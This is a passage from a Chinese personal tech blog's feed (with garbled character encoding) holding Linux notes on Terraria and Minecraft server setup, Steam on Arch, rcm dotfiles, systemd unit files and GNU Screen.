      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ­å»º-Terraria-Server-For-Linux</title>
    <link href="/2022/10/19/%E6%90%AD%E5%BB%BA-Terraria-Server-For-Linux/"/>
    <url>/2022/10/19/%E6%90%AD%E5%BB%BA-Terraria-Server-For-Linux/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a><a href="https://www.shells.com/l/en-US/tutorial/How-to-set-up-a-Terraria-Server-For-Ubuntu-Linux">å‚è€ƒ</a></h1><h2 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h2><p>å®‰è£…ä¸€äº›è½¯ä»¶:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt update <br>$ apt install unzip<br></code></pre></td></tr></table></figure><p>æ–°å»ºç›®å½•:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/Documents/terraria<br>$ <span class="hljs-built_in">cd</span> terraria<br></code></pre></td></tr></table></figure><h2 id="è·å–æœåŠ¡å™¨å®‰è£…åŒ…"><a href="#è·å–æœåŠ¡å™¨å®‰è£…åŒ…" class="headerlink" title="è·å–æœåŠ¡å™¨å®‰è£…åŒ…"></a>è·å–æœåŠ¡å™¨å®‰è£…åŒ…</h2><p>åœ¨ <a href="https://terraria.fandom.com/wiki/Server#Downloads">å®˜ç½‘</a> å¯ä»¥æŸ¥çœ‹ç›¸å…³åŒ…çš„é“¾æ¥.</p><p>åœ¨æ–°å»ºçš„ç›®å½•ä¸‹ä½¿ç”¨ wget ä¸‹è½½:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wget https://terraria.org/api/download/pc-dedicated-server/terraria-server-1445.zip<br></code></pre></td></tr></table></figure><h2 id="è§£å‹ç¼©å¹¶å®‰è£…"><a href="#è§£å‹ç¼©å¹¶å®‰è£…" class="headerlink" title="è§£å‹ç¼©å¹¶å®‰è£…"></a>è§£å‹ç¼©å¹¶å®‰è£…</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ unzip terraria-server-1445.zip<br></code></pre></td></tr></table></figure><p>è¿›å…¥ç›®å½•:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">cd</span> 1445<br>$ <span class="hljs-built_in">cd</span> Linux<br></code></pre></td></tr></table></figure><p>æ·»åŠ æƒé™:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo <span class="hljs-built_in">chmod</span> +x TerrariaServer.bin.x86*<br></code></pre></td></tr></table></figure><p>è¿è¡Œ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ./TerrariaServer.bin.x86_64<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆçš„ä¸–ç•Œä½äº <code>~/.local/share/Terraria/Worlds/</code> ç›®å½•ä¸‹.</p><h1 id="å‚è€ƒ-B-ç«™"><a href="#å‚è€ƒ-B-ç«™" class="headerlink" title="å‚è€ƒ B ç«™"></a><a href="https://www.bilibili.com/video/BV1vk4y167Ci/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™</a></h1>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨-ArchLinux-ä¸Šå®‰è£…-Steam</title>
    <link href="/2022/10/19/%E5%9C%A8-ArchLinux-%E4%B8%8A%E5%AE%89%E8%A3%85-Steam/"/>
    <url>/2022/10/19/%E5%9C%A8-ArchLinux-%E4%B8%8A%E5%AE%89%E8%A3%85-Steam/</url>
    
    <content type="html"><![CDATA[<p>ç›´æ¥é€šè¿‡ <code>pacman</code> å³å¯ä¸‹è½½:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo pacman -S steam<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GNU-stow-çš„ä½¿ç”¨</title>
    <link href="/2022/10/19/GNU-stow-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/19/GNU-stow-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨-rcm-ç®¡ç†é…ç½®æ–‡ä»¶</title>
    <link href="/2022/10/19/%E4%BD%BF%E7%94%A8-rcm-%E7%AE%A1%E7%90%86%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"/>
    <url>/2022/10/19/%E4%BD%BF%E7%94%A8-rcm-%E7%AE%A1%E7%90%86%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1RJ411H7SC/?spm_id_from=333.999.0.0&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™</a></p><p><a href="https://github.com/thoughtbot/rcm">github æ–‡æ¡£</a></p><h1 id="Arch-ä¸‹çš„å®‰è£…å’Œä½¿ç”¨"><a href="#Arch-ä¸‹çš„å®‰è£…å’Œä½¿ç”¨" class="headerlink" title="Arch ä¸‹çš„å®‰è£…å’Œä½¿ç”¨"></a>Arch ä¸‹çš„å®‰è£…å’Œä½¿ç”¨</h1><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>ä½¿ç”¨ <code>yay</code> ç›´æ¥å®‰è£…:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ yay -S rcm-git<br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>å››ä¸ªåŸºæœ¬çš„å‘½ä»¤:</p><ul><li><code>mkrc</code>, å°†é…ç½®æ–‡ä»¶çº³å…¥ <code>rcm</code> çš„ç®¡ç†</li><li><code>rcup</code>, ç”¨äºè¿˜åŸé…ç½®æ–‡ä»¶</li><li><code>rcdn</code>, ç”¨äºåˆ é™¤é…ç½®æ–‡ä»¶çš„é“¾æ¥æ–‡ä»¶</li><li><code>lsrc</code>, åˆ—å‡ºæœªæ‰“ä¸Šæ ‡ç­¾çš„é…ç½®æ–‡ä»¶</li></ul><p>æŒ‡å®šæ ‡ç­¾éƒ½æ˜¯ç”¨ <code>-t</code> å‚æ•°.</p><p>é¦–å…ˆéœ€è¦åˆ›å»º <code>$HOME/.dotfiles</code> ç›®å½• (dotfile å°±æ˜¯æŒ‡é…ç½®æ–‡ä»¶)</p><p>ä¼¼ä¹é™¤äº†ç‚¹é—®é¢˜, å¹¶æ²¡æœ‰åˆ›å»ºé“¾æ¥, å…ˆä¸ä½¿ç”¨.</p><h2 id="æŠ€å·§"><a href="#æŠ€å·§" class="headerlink" title="æŠ€å·§"></a>æŠ€å·§</h2><p>ä» manpage çœ‹, <code>$HOME/.dotfiles</code> ç›®å½•ä¸‹å­˜æ”¾çš„æ˜¯æºæ–‡ä»¶.</p><p>ç”¨ <code>mkrc</code> çº³å…¥ç®¡ç†æ—¶, éƒ½ä¼šå°†æ–‡ä»¶æ”¾å…¥å®¶ç›®å½•ä¸‹.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å¦‚ä½•ç¼–å†™-systemd-unit-file</title>
    <link href="/2022/10/19/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99-systemd-unit-file/"/>
    <url>/2022/10/19/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99-systemd-unit-file/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files">å‚è€ƒ1</a></p><p><a href="https://www.suse.com/support/kb/doc/?id=000019672">å‚è€ƒ2</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>unit æ˜¯ systemd ä¸­çš„ primary object. èµ„æºæ˜¯ç”¨ unit æ–‡ä»¶ä½œä¸ºé…ç½®æ–‡ä»¶.</p><h1 id="Unit-Files-çš„ä½ç½®"><a href="#Unit-Files-çš„ä½ç½®" class="headerlink" title="Unit Files çš„ä½ç½®"></a>Unit Files çš„ä½ç½®</h1><h2 id="lib-systemd-system"><a href="#lib-systemd-system" class="headerlink" title="/lib/systemd/system/"></a><code>/lib/systemd/system/</code></h2><p>é»˜è®¤ä½äº <code>/lib/systemd/system/</code> ç›®å½•ä¸‹. è½¯ä»¶å®‰è£… unit file å°±ä¼šæ”¾åˆ°è¿™é‡Œ. ä¸è¯¥åœ¨è¿™ä¸ªç›®å½•ä¸‹ç¼–è¾‘æ–‡ä»¶, å¯ä»¥é‡å†™æ–‡ä»¶.</p><h2 id="etc-systemd-system"><a href="#etc-systemd-system" class="headerlink" title="/etc/systemd/system/"></a><code>/etc/systemd/system/</code></h2><p>æœ€å¥½æ˜¯åœ¨ <code>/etc/systemd/system/</code> ç›®å½•ä¸‹ç¼–å†™, å…¶æ‹¥æœ‰æœ€é«˜çš„ä¼˜å…ˆçº§.</p><p>å¯¹äºä¸€ä¸ª unit, å¯ä»¥ç»™å…¶åˆ›å»ºå­ç›®å½•, æ ¼å¼ä¸º (å¦‚æœ unit å« <code>example.services</code>): <code>example.services.d</code>, åœ¨å­ç›®å½•ä¸‹ç¼–å†™ <code>.conf</code> æ–‡ä»¶å³å¯. </p><h2 id="run-systemd-system"><a href="#run-systemd-system" class="headerlink" title="/run/systemd/system/"></a><code>/run/systemd/system/</code></h2><p>run-time unit definitions ä½äº <code>/run/systemd/system/</code> å…¶ä¼˜å…ˆçº§ä»‹äº <code>/lib/systemd/system/</code> å’Œ <code>/etc/systemd/system/</code> ä¹‹é—´.</p><p>ä»»ä½•åœ¨å…¶ä¸­çš„ä¿®æ”¹åœ¨é‡å¯åéƒ½ä¼šä¸¢å¤±. å…¶ç”¨äºåœ¨ runtime åŠ¨æ€åˆ›å»º unit file.</p><h1 id="Unit-çš„ç±»å‹"><a href="#Unit-çš„ç±»å‹" class="headerlink" title="Unit çš„ç±»å‹"></a>Unit çš„ç±»å‹</h1><p>å‚è€ƒé¸Ÿå“¥:<br><img src="/../img/unit_file_types.png"></p><p>æœ‰ä¸€äº› unit file æ˜¯ç”¨æ¥ trigger å…¶ä»–çš„ unit.</p><h1 id="Unit-file-è§£æ"><a href="#Unit-file-è§£æ" class="headerlink" title="Unit file è§£æ"></a>Unit file è§£æ</h1><p>Unit file ç”¨ sections æ¥ç»„ç»‡, æ¯ä¸€ä¸ª section ç”¨ <code>[]</code> åŒ…è£¹çš„åç§°å¼€å§‹.</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Section]</span><br><span class="hljs-attr">Directive1</span>=value<br><span class="hljs-attr">Directive2</span>=value<br></code></pre></td></tr></table></figure><h2 id="General-Characteristics-of-Unit-Files"><a href="#General-Characteristics-of-Unit-Files" class="headerlink" title="General Characteristics of Unit Files"></a>General Characteristics of Unit Files</h2><p>Section çš„åç§°æ˜¯ well-defined å’Œ case-sensitive çš„.</p><p>å¦‚æœæƒ³æ·»åŠ éæ ‡å‡†çš„ section æ¥è®© <code>systemd</code> ä»¥å¤–çš„ç¨‹åºä½¿ç”¨, éœ€è¦åœ¨ section name ä¹‹å‰æ·»åŠ  a <code>X-</code> prefix.</p><p>åœ¨ section ä¹‹ä¸­, é€šè¿‡ key-value çš„æ ¼å¼æ¥å®šä¹‰ unit behavior å’Œ metadata.</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Section]</span><br><span class="hljs-attr">Directive1</span>=value<br><span class="hljs-attr">Directive2</span>=value<br></code></pre></td></tr></table></figure><p>åœ¨ä¸€ä¸ª override file ä¸­æƒ³è¦ reset ä¸€ä¸ª directive, ç”¨ç©ºå­—ç¬¦ä¸²ç»™å…¶èµ‹å€¼:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">Directive1</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>ä¸€äº› boolean è¡¨è¾¾:<br>    - çœŸ: 1, yes, on, true<br>    - å‡: o, no, off, false</p><h2 id="Unit-Section-çš„-Directives"><a href="#Unit-Section-çš„-Directives" class="headerlink" title="[Unit] Section çš„ Directives"></a>[Unit] Section çš„ Directives</h2><p>ç¬¬ä¸€ä¸ª Section ä¸€èˆ¬æ˜¯ <code>[Unit]</code>. ç”¨æ¥å®šä¹‰ unit çš„ä¸€äº› metadata ä»¥åŠé…ç½®å…¶å’Œå…¶ä»– unit çš„å…³ç³».</p><p>å°½ç®¡ section çš„é¡ºåºå¯¹äº <code>systemd</code> æ¥è¯´æ— å…³ç´§è¦. <code>[Unit]</code> section ä¸€èˆ¬è¿˜æ˜¯æ”¾åœ¨ unit file çš„é¡¶éƒ¨.</p><p> ä¸€äº›å¸¸è§çš„ directives:</p><ul><li><code>Description=</code>: å¯ä»¥ç”¨æ¥æè¿°è¿™ä¸ª unit çš„åç§°å’ŒåŸºæœ¬ç”¨é€”</li><li><code>Documentation=</code>: æä¾›å¯æŸ¥é˜…çš„ document çš„ä½ç½®, è¯¥å€¼ç”¨ <code>systemctl status</code> å¯ä»¥è¿”å›, å¦‚: <code>Documentation=man:systemd.special(7)</code></li><li><code>Requires=</code>: åˆ—å‡ºéœ€è¦ä¾èµ–çš„å…¶ä»– unit, è¿™äº› unit åœ¨é»˜è®¤æƒ…å†µä¸‹ä¼šè¢« started in parallel with the current unit</li><li><code>Wants=</code>: å’Œ <code>Requires=</code> ç±»ä¼¼, ä½†æ²¡é‚£ä¹ˆä¸¥æ ¼, <code>systemd</code> ä¼šå°è¯•å¯åŠ¨ any units listed here, å¦‚æœæ²¡æ‰¾åˆ°æˆ–å¯åŠ¨å¤±è´¥, å½“å‰ unit ä»ç„¶å¯ä»¥å·¥ä½œ.</li><li><code>BindsTo=</code>: å’Œ <code>Requires=</code> ç±»ä¼¼, ä½†åœ¨ å…¶ä»– unit ç»ˆæ­¢æ—¶, å½“å‰ unit ä¹Ÿä¼šåœæ­¢</li><li><code>Before=</code>: å½“å‰ unit åœ¨å…¶åˆ—å‡ºçš„ unit å¯åŠ¨å‰å¯åŠ¨</li><li><code>After=</code>: åœ¨å½“å‰ unit åœ¨å…¶åˆ—å‡ºçš„ unit å¯åŠ¨åå¯åŠ¨</li><li><code>Conflicts=</code>: åˆ—å‡ºçš„ unit ä¸èƒ½å’Œå½“å‰ unit åŒæ—¶è¿è¡Œ, å¯åŠ¨å…¶åˆ—å‡ºçš„ unit ä¼šå¯¼è‡´å½“å‰ unit åœæ­¢</li><li><code>Condition...=</code>:</li><li><code>Assert...=</code>:</li></ul><h2 id="Install-Section-Directives"><a href="#Install-Section-Directives" class="headerlink" title="[Install] Section Directives"></a>[Install] Section Directives</h2><p>Unit file çš„æœ€åä¸€ä¸ª section ä¸€èˆ¬æ˜¯ <code>[Install]</code> section. è¿™ä¸ª section æ˜¯å¯é€‰çš„, ç”¨æ¥å®šä¹‰ä¸€ä¸ª unit åœ¨ enable ä¹‹åçš„è¡Œä¸º, enable å³å¼€æœºè‡ªåŠ¨å¯åŠ¨.</p><p>å› æ­¤, åªæœ‰ units that can be enabled æ‰ä¼šæœ‰è¿™ä¸ª section.</p><p>è¿™ä¸ª section çš„ directives:</p><ul><li><code>WantedBy=</code>: è¡¨æ˜ how a unit should be enabled. å…¶å…è®¸ä½ åƒ <code>Wants=</code> ä¸€æ ·æŒ‡æ˜ä¸€ä¸ªä¾èµ–å…³ç³», å½“æ‹¥æœ‰è¿™ä¸ª directive çš„ unit è¢« enable å, å…¶ä¼šåœ¨ <code>/etc/systemd/system/</code> ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåç¼€ä¸º <code>.wants</code> çš„ç›®å½•. ä¹‹åä¼šåˆ›å»ºä¸€ä¸ª symbolic link åˆ°å½“å‰æ–‡ä»¶.</li><li><code>RequiredBy=</code>: å’Œ <code>WantedBy=</code> ç±»ä¼¼, ä½†åœ¨ä¾èµ–ä¸å­˜åœ¨æ—¶ä»å’Œå¼€å¯, ä¼šåˆ›å»º <code>.requires</code> çš„ç›®å½•</li><li><code>Alias=</code>: å…è®¸è¿™ä¸ª unit ç”¨å¦ä¸€ä¸ªåç§°æ¥ enable</li><li><code>Also=</code>: å…è®¸ unit ä½œä¸ºä¸€ä¸ª set è¢« enable</li><li><code>DefaultInstance=</code>:</li></ul><h2 id="Unit-specific-Section-Directives"><a href="#Unit-specific-Section-Directives" class="headerlink" title="Unit-specific Section Directives"></a>Unit-specific Section Directives</h2><h3 id="The-Service-Section"><a href="#The-Service-Section" class="headerlink" title="The [Service] Section"></a>The [Service] Section</h3><p>ç”¨æ¥æä¾›é…ç½®.</p><p>æœ€åŸºæœ¬çš„æ˜¯è®¾ç½® <code>Type=</code>, å…¶æœ‰å¦‚ä¸‹é€‰é¡¹:</p><ul><li>simple: è®¾ç½®äº†ä¹‹å, service çš„ä¸»è¦è¿›ç¨‹ä¼šåœ¨ start line ä¸­æ˜¾ç¤º. å½“ <code>Type=</code> å’Œ <code>Busname=</code> æœªè®¾ç½®, <code>ExecStart</code> è®¾ç½®äº†çš„æ—¶å€™, å…¶æ˜¯é»˜è®¤å€¼.</li><li>forking: å½“ service fork äº†ä¸€ä¸ª child process æ˜¯ä½¿ç”¨. å…¶å‘Šè¯‰ <code>systemd</code> å½“ parent exit çš„æ—¶å€™ç¨‹åºä»ç„¶åœ¨è¿è¡Œ.</li><li>oneshot: æŒ‡æ˜è¿›ç¨‹ä¼š short-lived, ç„¶å <code>systemd</code> åº”è¯¥ç­‰å¾…è¿›ç¨‹é€€å‡º before continuing on with other units, å…¶ä¸º <code>Type=</code> å’Œ <code>ExecStart=</code> æœªè®¾ç½®æ—¶çš„é»˜è®¤å€¼</li><li>dbus: æŒ‡æ˜ unit will take a name on the D-Bus bus</li><li>notify: æŒ‡æ˜ service will issue a notification when it has finished starting up</li><li>idle:</li></ul><p>å…¶ä»–çš„ directive:</p><ul><li><code>ExecStart=</code>: æŒ‡æ˜å¼€å¯è¿›ç¨‹çš„å‘½ä»¤çš„ full path and arguments, åªèƒ½æŒ‡å®šä¸€ä¸ª, å¦‚æœå‘½ä»¤ä¹‹å‰ preceded by a dash <code>-</code> character, ä¼šä½¿å‘½ä»¤åœ¨è¿”å›éé›¶å€¼æ—¶ç¨‹åºä¸ä¼šåœæ­¢</li><li><code>ExecStartPre=</code>: åœ¨ mian process å¯åŠ¨ä¹‹å‰æ‰§è¡Œ, å¯å¤šæ¬¡ä½¿ç”¨, åŒæ ·, å¦‚æœå‘½ä»¤ä¹‹å‰ preceded by a dash <code>-</code> character, ä¼šä½¿å‘½ä»¤åœ¨è¿”å›éé›¶å€¼æ—¶ç¨‹åºä¸ä¼šåœæ­¢</li><li><code>ExecStartPost=</code>: ä¹‹å</li><li><code>ExecReload=</code>: å¯é€‰, æŒ‡æ˜ç”¨æ¥ reload é…ç½®æ–‡ä»¶çš„å‘½ä»¤</li><li><code>ExecStop=</code>: ç”¨æ¥ stop service çš„å‘½ä»¤, å¦‚æœæ²¡æœ‰æŒ‡æ˜, the main process will be killed immediately when the service is stopped</li><li><code>ExecStopPost=</code>: åœ¨ stop command execute ä¹‹åæ‰§è¡Œ</li><li><code>RestartSec=</code>: æŒ‡æ˜å°è¯•é‡å¯å‰éœ€è¦ç­‰å¾…çš„æ—¶é—´</li><li><code>Restart=</code>: å¯ä»¥è®¾ç½® â€œalwaysâ€, â€œon-successâ€, â€œon-failureâ€, â€œon-abnormalâ€, â€œon-abortâ€, â€œon-watchdogâ€ ç­‰</li><li><code>TimeoutSec=</code>: åœ¨ä½  stop ä¸€ä¸ª service æ—¶, <code>systemd</code> å°†å…¶æ ‡è®°ä¸º failed æˆ– forcefully killing çš„ç­‰å¾…æ—¶é—´.</li></ul><p>å…¶ä»–çš„å‚è€ƒåšæ–‡å³å¯.</p><h1 id="ä»-Template-Unit-Files-åˆ›å»ºå®ä¾‹"><a href="#ä»-Template-Unit-Files-åˆ›å»ºå®ä¾‹" class="headerlink" title="ä» Template Unit Files åˆ›å»ºå®ä¾‹"></a>ä» Template Unit Files åˆ›å»ºå®ä¾‹</h1><h2 id="Template-and-Instance-Unit-Names"><a href="#Template-and-Instance-Unit-Names" class="headerlink" title="Template and Instance Unit Names"></a>Template and Instance Unit Names</h2><p>ç”¨ <code>@</code> æ ‡è¯† Template unit files.</p><p>å¦‚: <code>example@.service</code></p><p>å½“ä¸€ä¸ª Instance æ˜¯ä»ä¸€ä¸ª template åˆ›å»ºçš„, å…¶ instance identifier æ”¾åœ¨ <code>@</code> å’Œ unit type ä¹‹é—´: <code>example@instance1.service</code></p><p>ä¸€ä¸ª instance file å¸¸å¸¸æ˜¯ template file çš„ symbolic link.</p><h2 id="Template-Specifiers"><a href="#Template-Specifiers" class="headerlink" title="Template Specifiers"></a>Template Specifiers</h2>]]></content>
    
    
    <categories>
      
      <category>Linu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GNU-Screen-çš„ä½¿ç”¨</title>
    <link href="/2022/10/19/GNU-Screen-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/19/GNU-Screen-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/GNU_Screen">å‚è€ƒ ArchWiki</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>GNU Screen æ˜¯ä¸€ä¸ªå…¨å±çª—å£ç®¡ç†å™¨. å…¶èƒ½å¤Ÿåœ¨å¤šè¿›ç¨‹ä¸­å¤ç”¨ a physical terminal.</p><p>åœ¨ Screen ä¸­è¿è¡Œçš„ Programs å¯ä»¥åœ¨ä½  detached ä¹‹åæŒç»­è¿è¡Œ. </p><p>å¯æŸ¥é˜… <a href="https://www.gnu.org/software/screen/manual/screen.html#Overview">æ‰‹å†Œ</a>.</p><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><p>ä½¿ç”¨å¿«æ·é”®æ“ä½œ. å…·ä½“æŸ¥çœ‹ Wiki å’Œ æ‰‹å†Œ.</p><h2 id="Named-sessions"><a href="#Named-sessions" class="headerlink" title="Named sessions"></a>Named sessions</h2><p>ä½¿ç”¨ <code>-S</code> å‚æ•°:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ screen -S session_name<br></code></pre></td></tr></table></figure><p>åˆ—å‡ºæ‰€æœ‰ sessions:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ screen -list<br></code></pre></td></tr></table></figure><p>attach ä¸€ä¸ª named screen session:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ screen -x session_name<br></code></pre></td></tr></table></figure><p>æˆ–è€…:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ screen -r session_name<br></code></pre></td></tr></table></figure><h2 id="è‡ªå®šä¹‰-Screen"><a href="#è‡ªå®šä¹‰-Screen" class="headerlink" title="è‡ªå®šä¹‰ Screen"></a>è‡ªå®šä¹‰ Screen</h2><p>å¯ä»¥ä¿®æ”¹ Screen çš„é»˜è®¤è®¾ç½®.</p><p>å…¶é…ç½®æ–‡ä»¶ä¸º <code>~/.screenrc</code>.</p><h1 id="å¼€æœºå¯åŠ¨"><a href="#å¼€æœºå¯åŠ¨" class="headerlink" title="å¼€æœºå¯åŠ¨"></a>å¼€æœºå¯åŠ¨</h1><p>åˆ©ç”¨ <code>systemd</code> è‡ªåŠ¨å¯åŠ¨.</p><p>è‡ªåŠ¨å¯åŠ¨ç‰¹å®šç”¨æˆ·çš„ service:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ systemctl <span class="hljs-built_in">enable</span> screen@florian<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æˆ‘çš„ä¸–ç•ŒæœåŠ¡å™¨æ­å»º</title>
    <link href="/2022/10/18/%E6%88%91%E7%9A%84%E4%B8%96%E7%95%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/10/18/%E6%88%91%E7%9A%84%E4%B8%96%E7%95%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a><a href="https://phoenixnap.com/kb/minecraft-dedicated-server">å‚è€ƒ</a></h1><h2 id="1-ç”¨-ssh-è¿æ¥æœåŠ¡å™¨"><a href="#1-ç”¨-ssh-è¿æ¥æœåŠ¡å™¨" class="headerlink" title="1. ç”¨ ssh è¿æ¥æœåŠ¡å™¨"></a>1. ç”¨ ssh è¿æ¥æœåŠ¡å™¨</h2><h2 id="2-å®‰è£…-Java"><a href="#2-å®‰è£…-Java" class="headerlink" title="2. å®‰è£… Java"></a>2. å®‰è£… Java</h2><p>å®‰è£…æœ€æ–°ç‰ˆçš„ OpenJDK:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo apt update<br>$ sudo apt install default-jdk<br>$ java -version<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯æ•™ç¨‹ä¸­ç»™çš„ä¸‹è½½ç‰ˆæœ¬, å®æ“åæŠ¥é”™è¯´ç‰ˆæœ¬ä¸å¤Ÿ, å› æ­¤é‡æ–°è£…äº†ä¸€ä¸ª:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt install openjdk-18-jdk-headless<br></code></pre></td></tr></table></figure><h2 id="3-å®‰è£…-screen"><a href="#3-å®‰è£…-screen" class="headerlink" title="3. å®‰è£… screen"></a>3. å®‰è£… screen</h2><p>screen æ˜¯ä¿æŒæœåŠ¡å™¨åœ¨ä½  disconnect çš„æ—¶å€™ä»ç„¶æŒç»­è¿è¡Œ.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt install screen <br></code></pre></td></tr></table></figure><h2 id="4-åˆ›å»ºä¸€ä¸ªç›®å½•"><a href="#4-åˆ›å»ºä¸€ä¸ªç›®å½•" class="headerlink" title="4. åˆ›å»ºä¸€ä¸ªç›®å½•"></a>4. åˆ›å»ºä¸€ä¸ªç›®å½•</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">mkdir</span> minecraft<br>$ <span class="hljs-built_in">cd</span> minecraft<br></code></pre></td></tr></table></figure><h2 id="5-ä¸‹è½½é…ç½®æ–‡ä»¶"><a href="#5-ä¸‹è½½é…ç½®æ–‡ä»¶" class="headerlink" title="5. ä¸‹è½½é…ç½®æ–‡ä»¶"></a>5. ä¸‹è½½é…ç½®æ–‡ä»¶</h2><p><a href="https://www.minecraft.net/en-us/download/server">ä¸‹è½½é¡µé¢</a></p><p>ä½¿ç”¨ <code>wget</code> ä¸‹è½½:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wget https://piston-data.mojang.com/v1/objects/f69c284232d7c7580bd89a5a4931c3581eae1378/server.jar<br></code></pre></td></tr></table></figure><p>é‡å‘½åæ¥ä½“ç°ç‰ˆæœ¬:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">mv</span> server.jar 